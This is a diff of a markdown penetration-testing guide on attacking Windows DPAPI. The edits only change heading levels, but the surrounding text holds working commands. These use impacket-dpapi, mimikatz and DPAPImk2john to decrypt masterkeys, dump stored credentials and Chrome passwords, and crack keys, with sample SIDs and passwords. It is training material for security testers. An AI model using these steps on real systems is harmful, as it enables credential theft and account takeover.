@@ -55,11 +55,11 @@ Once access to a system is obtained, a pentester can leverage DPAPI to:
     
 - Access secrets **without requiring user interaction**
 
-#### DPAPI Attack Scenarios
-###  1. Access via User Password
+### DPAPI Attack Scenarios
+####  1. Access via User Password
 
 If a user's plaintext password is captured (e.g., through phishing, credential dumping, or brute-force), it can be used directly to decrypt the user’s masterkey and retrieve DPAPI-protected secrets.
-#### Tools:
+##### Tools:
 
 - mimikatz
 
@@ -69,27 +69,27 @@ If a user's plaintext password is captured (e.g., through phishing, credential d
 
 - impacket-dpapi
 
-#### Practical Example with impacket-dpapi:
+##### Practical Example with impacket-dpapi:
 
-##### Step 1: Extract the masterkey file
+###### Step 1: Extract the masterkey file
 
 ```powershell
 C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\
 ```
 
-##### Step 2: Locate DPAPI credential blobs
+###### Step 2: Locate DPAPI credential blobs
 
 ```powershell
 C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
 ```
 
-##### Step 3: Decrypt the masterkey using the known password
+###### Step 3: Decrypt the masterkey using the known password
 
 ```bash
 impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
 ```
 
-##### Step 4: Use the decrypted key to unlock credentials
+###### Step 4: Use the decrypted key to unlock credentials
 
 ```bash
 impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key <decrypted_key>
@@ -102,7 +102,7 @@ Username : acme\l.paredes_ops
 Password : Uncr4ck4bl3P4ssW0rd0312
 ```
 
-####  Why This Works
+#####  Why This Works
 
 - No need for NTLM hashes or domain-level access.
 
@@ -110,10 +110,10 @@ Password : Uncr4ck4bl3P4ssW0rd0312
 
 - Faster and more direct than Pass-the-Hash methods.
 
-###  2. Access via NTLM Hash
+####  2. Access via NTLM Hash
 
 If a user’s NTLM hash is available (e.g., via LSASS dump, DCSync, or Pass-the-Hash), it can also be used to decrypt DPAPI secrets.
-####  Requirements:
+#####  Requirements:
 
 - User's SID
 
@@ -121,13 +121,13 @@ If a user’s NTLM hash is available (e.g., via LSASS dump, DCSync, or Pass-the-
 
 - Target credential blob or masterkey file
 
-####  Example using mimikatz:
+#####  Example using mimikatz:
 
 ```powershell
 mimikatz # dpapi::cred /in:CRED_FILE.crd /sid:S-1-5-21-... /hash:<NTLM_HASH>
 ```
 
-###  3. Access with SYSTEM Privileges
+####  3. Access with SYSTEM Privileges
 
 With **SYSTEM-level privileges**, a tester can:
 
@@ -137,7 +137,7 @@ With **SYSTEM-level privileges**, a tester can:
     
 - Extract secrets without requiring user interaction
 
-####  Recommended Tools:
+#####  Recommended Tools:
 
 - `mimikatz`
     
@@ -145,24 +145,24 @@ With **SYSTEM-level privileges**, a tester can:
     
 - `Seatbelt`
 
-####  Example:
+#####  Example:
 
 ```powershell
 mimikatz # privilege::debug
 mimikatz # lsadump::dpapi
 ```
 
-###  4. Extracting Application Secrets (e.g., Chrome)
+####  4. Extracting Application Secrets (e.g., Chrome)
 
 Many applications, like Google Chrome, rely on DPAPI to encrypt sensitive user data.
-####  Target File:
+#####  Target File:
 
 ```bash
 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
 ```
 
 This is a SQLite database containing DPAPI-encrypted blobs. With the user’s masterkey and profile, a tester can recover all saved browser passwords.
-####  Tools:
+#####  Tools:
 
 - `chrome_dpapi_decrypt.py`
     
@@ -172,10 +172,10 @@ This is a SQLite database containing DPAPI-encrypted blobs. With the user’s ma
     
 - `BrowserGather`
 
-### 5. Validating and Cracking Masterkeys with dpapimk2john
+#### 5. Validating and Cracking Masterkeys with dpapimk2john
 
 If a DPAPI masterkey is obtained but the password is unknown, it can be validated or cracked using John the Ripper, after converting it with DPAPImk2john.
-#### Example 1: Validate a Known Password
+##### Example 1: Validate a Known Password
 
 Assumptions:
 
@@ -190,7 +190,7 @@ DPAPImk2john -mk ../S-1-5-21-2168718921-3906202695-65158103-1000/655a0446-8420-4
 ```
 
 If correct, the decrypted key will be displayed.
-#### Example 2: Crack with Dictionary
+##### Example 2: Crack with Dictionary
 
 Convert masterkey to John-compatible hash:
 
